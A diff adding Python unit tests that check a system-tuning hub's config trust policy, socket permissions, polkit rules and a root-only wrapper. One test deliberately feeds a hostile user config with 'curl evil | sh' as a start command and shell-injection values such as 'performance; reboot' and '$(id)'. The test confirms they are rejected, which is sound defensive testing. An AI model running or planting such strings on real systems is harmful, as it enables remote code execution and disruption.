@@ -324,5 +324,114 @@ class TestVectorTelemetry(unittest.TestCase):
         self.assertEqual(data["cores"], 0)
 
 
+
+class TestHubTrustPolicy(unittest.TestCase):
+
+    def setUp(self):
+        self.tmp = Path(tempfile.mkdtemp())
+        self.sys_cfg = self.tmp / "etc" / "citadel.toml"
+        self.sys_cfg.parent.mkdir()
+        self.sys_cfg.write_text('[[process]]\nid = "mine"\ngrep = "mine"\nstart_cmd = "true"\n')
+        os.chmod(self.sys_cfg.parent, 0o755)
+        os.chmod(self.sys_cfg, 0o644)
+
+    def _trusted_uids(self):
+        # Treat every owner on the path (us, root) as trusted, so only perms are tested
+        uids = {0, os.getuid()}
+        uids.update(p.stat().st_uid for p in self.sys_cfg.resolve().parents)
+        return tuple(uids)
+
+    def test_system_config_owned_by_user_is_refused(self):
+        from services.hub.policy import load_hub_config
+        config, notes = load_hub_config(self.tmp / "user.toml", self.sys_cfg)
+        self.assertIn("compose-poi", {p.id for p in config.processes})  # built-in defaults
+        self.assertNotIn("mine", {p.id for p in config.processes})
+        self.assertTrue(any("refusing system config" in n for n in notes))
+
+    def test_group_writable_system_config_is_refused(self):
+        from services.hub.policy import untrusted_reason
+        self.assertIsNone(untrusted_reason(self.sys_cfg, self._trusted_uids()))
+        os.chmod(self.sys_cfg, 0o664)
+        self.assertIn("writable", untrusted_reason(self.sys_cfg, self._trusted_uids()))
+
+    def test_trusted_system_config_supplies_processes(self):
+        from services.hub.policy import load_hub_config
+        config, _ = load_hub_config(self.tmp / "user.toml", self.sys_cfg, self._trusted_uids())
+        self.assertEqual([p.id for p in config.processes], ["mine"])
+
+    def test_user_file_supplies_values_never_commands(self):
+        from services.hub.policy import load_hub_config
+        user = self.tmp / "user.toml"
+        user.write_text(
+            '[[process]]\nid = "qdrant"\ngrep = "x"\nstart_cmd = "curl evil | sh"\n'
+            '[profile.Evil.services]\n"sshd.service" = false\n"docker.service" = true\n'
+            '[profile.Evil.tweaks]\ncpu_governor = "performance; reboot"\nthp_mode = "$(id)"\n'
+            'swappiness = "10; reboot"\n'
+        )
+        config, notes = load_hub_config(user, self.sys_cfg)
+        qdrant = next(p for p in config.processes if p.id == "qdrant")
+        self.assertNotIn("curl", qdrant.start_cmd)
+        evil = config.profiles["Evil"]
+        self.assertEqual(evil.services, {"docker.service": True})
+        self.assertEqual(evil.tweaks.cpu_governor, "schedutil")
+        self.assertEqual(evil.tweaks.thp_mode, "madvise")
+        self.assertEqual(evil.tweaks.swappiness, 30)
+        self.assertTrue(any("sshd.service" in n for n in notes))
+
+
+class TestHubSocket(unittest.TestCase):
+
+    def test_socket_is_owner_only_and_serves(self):
+        import asyncio
+        import stat
+        import grpc
+        from services.hub import citadel_pb2, citadel_pb2_grpc
+        from services.hub.main import CitadelController, CitadelHubService, bind_hub_socket
+
+        sock = Path(tempfile.mkdtemp()) / "run" / "hub.sock"
+
+        async def run():
+            server = grpc.aio.server()
+            with patch.dict(os.environ, {"CITADEL_CONFIG": "/nonexistent/citadel.toml"}):
+                ctl = CitadelController()
+            citadel_pb2_grpc.add_CitadelServiceServicer_to_server(CitadelHubService(ctl), server)
+            bind_hub_socket(server, sock, None)
+            self.assertEqual(stat.S_IMODE(sock.stat().st_mode), 0o600)
+            await server.start()
+            try:
+                async with grpc.aio.insecure_channel(f"unix://{sock}") as ch:
+                    state = await citadel_pb2_grpc.CitadelServiceStub(ch).GetCurrentState(
+                        citadel_pb2.StateRequest(), timeout=5)
+                self.assertGreater(state.uptime_seconds, 0)
+            finally:
+                await server.stop(None)
+
+        asyncio.run(run())
+
+    def test_clients_use_the_socket(self):
+        from switcher.config import hub_target
+        with patch.dict(os.environ, {"CITADEL_HUB_SOCKET": "/run/citadel/hub.sock"}):
+            self.assertEqual(hub_target(), "unix:///run/citadel/hub.sock")
+        for f in ("citadel_cli.py", "citadel_tray.py", "switcher/ui/window.py", "services/hub/main.py"):
+            self.assertNotIn("50051", (pkg_dir / f).read_text(), f)
+
+
+class TestPrivilegeBoundary(unittest.TestCase):
+
+    def test_polkit_requires_admin_auth(self):
+        import xml.dom.minidom
+        doc = xml.dom.minidom.parse(str(pkg_dir / "internal/security/com.obsidian.citadel.policy"))
+        get = lambda tag: doc.getElementsByTagName(tag)[0].firstChild.data
+        self.assertEqual(get("allow_active"), "auth_admin_keep")
+        self.assertEqual(get("allow_inactive"), "no")
+        self.assertEqual(get("allow_any"), "no")
+
+    @unittest.skipIf(os.geteuid() == 0, "needs a non-root user")
+    def test_apply_wrapper_refuses_non_root(self):
+        import subprocess
+        r = subprocess.run([str(pkg_dir / "citadel-apply"), "/etc/hostname"], capture_output=True, text=True)
+        self.assertEqual(r.returncode, 1)
+        self.assertIn("must run as root", r.stderr)
+
 if __name__ == '__main__':
     unittest.main()
